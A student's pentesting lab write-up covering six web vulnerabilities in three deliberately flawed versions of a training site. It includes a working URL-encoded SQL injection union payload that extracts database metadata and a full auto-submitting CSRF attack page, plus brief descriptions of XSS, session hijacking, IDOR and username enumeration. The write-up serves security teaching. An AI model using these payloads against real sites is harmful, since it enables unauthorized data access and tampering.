# Project 8 - Pentesting Live Targets

Time spent: 7 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

### Vulnerability #1: __SQL Injection and Extra Bonus__
By using ``` https://104.155.169.96/blue/public/salesperson.php?id=%27%20union%20select%201,(select%20concat(%222select%20database()%20is%20%22,%20(select%20database()))),(select%20concat(%22-----------------3select%20user()%20is%20%22,%20(select%20user()))),(select%20concat(%224select%20version()%20is%20%22,%20(select%20version()))),5%20--%20 ``` I can make the id query come back with some unioned table and database metadata - things an attacker should not have access to!
    
![](https://github.com/nke5ka/codepathWeek8/blob/master/blue1.gif)

### Vulnerability #2: __Session Hijacking/Fixation__
By using the built in session changing tool, I can steal the session ID from one user and login as them without credential checking.
    
![](https://github.com/nke5ka/codepathWeek8/blob/master/blue2.gif)

## Green

### Vulnerability #1: __User Enumeration__
Using logins that have a real username leads to a bolded error message, but logins using nonexistent username leads to an unbolded error message.
    
![](https://github.com/nke5ka/codepathWeek8/blob/master/green1.gif)

### Vulnerability #2: __Cross Site Scripting__
By using script alert, an attacker can add a comment which when viewed leads to execution of arbitrary javascript.
    
![](https://github.com/nke5ka/codepathWeek8/blob/master/green2.gif)
![](https://github.com/nke5ka/codepathWeek8/blob/master/green2b.gif)

## Red

### Vulnerability #1: __Insecure Direct Object Reference__
A non logged in user can access any salesperson by changing their ID - even ones not listed.
    
![](https://github.com/nke5ka/codepathWeek8/blob/master/red1.gif)
    
### Vulnerability #2: __Cross Site Request Forgery__
By accessing a hacker's page with the following html, a logged in user can unknowingly change values via post request to be the values the hacker desires.
    
![](https://github.com/nke5ka/codepathWeek8/blob/master/red2.gif)
    
```
<html>
<!-- <body onload="document.form2Sub.submit()"> -->
<iframe name="secretsarenofun" src="#" style="display: none;">
</iframe>
<form action="https://104.155.169.96/red/public/staff/countries/edit.php?id=2" method="post" name="form2Sub" id="formYesPls" target="secretsarenofun">
    <input type="hidden" name="name" value="Canadia555HACKED" />
    <input type="hidden" name="code" value="CA" />
</form>
Welcome to my not sketchy site - enjoy visiting, don't look at the source code or even think this is weird or sketchy.  Oh hai there.
<!--</body>-->
<script>
var sketchyform = document.getElementById("formYesPls");
sketchyform.style.display = "none";
sketchyform.submit();
</script>
</html>
```

## Notes
Lots of fun!
Only Firefox by default allows xframeoptions to load offsite
Bonus Objective 1: SQL goes beyond just showing the database injection, but also get important information about the system.
